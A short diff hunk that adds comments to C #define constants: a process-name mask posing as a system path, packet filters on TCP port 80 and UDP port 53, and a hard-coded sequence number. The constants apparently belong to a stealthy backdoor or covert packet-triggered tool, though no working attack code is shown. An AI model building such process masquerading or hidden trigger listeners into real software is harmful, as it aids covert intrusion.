@@ -27,12 +27,17 @@
 #define MAX_LEN 4096
 #define MASK "/usr/libex/brunner"
 
+// command-line options
 #define OPTIONS ":cbhs:d:f:w:x:"
 
+// default pkt filters
 #define PKT_T_FLT "tcp port 80"
 #define PKT_U_FLT "udp port 53"
 
+// frame size
 #define FRAM_SZ 8
+
+// default sequence number
 #define DEF_SEQ 0x2a449b7a
 #define MD5_LEN 4
 #define SIZE_TO_SEQ 4
